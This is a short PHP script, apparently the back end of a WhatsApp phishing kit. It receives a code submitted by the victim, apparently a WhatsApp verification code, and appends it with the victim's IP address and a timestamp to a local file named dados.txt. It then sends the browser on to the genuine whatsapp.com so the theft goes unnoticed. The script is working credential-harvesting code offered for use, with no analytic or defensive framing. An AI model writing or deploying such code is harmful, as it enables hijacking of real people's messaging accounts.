<?php

$ip = $_SERVER["REMOTE_ADDR"]."\r\n";
$hora = date("Y-m-d  #  H:i:s")."\r\n";
$codigo=$_POST['code']."\r\n";

$traco="=============WHATSAPP================"."\r\n";
$seuip="IP: ";
$seuhora="HORA: ";
$seuemail="EMAIL: ";
$seucodigo="CODIGO: ";

$file = fopen("dados.txt","a");
$escrever0=fwrite($file, $traco);
$escrever1=fwrite($file, $seuip);
$escrever2=fwrite($file, $ip);
$escrever3=fwrite($file, $seuhora);
$escrever4=fwrite($file, $hora);
$escrever5=fwrite($file, $seucodigo);
$escrever6=fwrite($file, $codigo);
fclose($file);
?>
<script language="JavaScript"> 
window.location="https://whatsapp.com"; 
</script> 
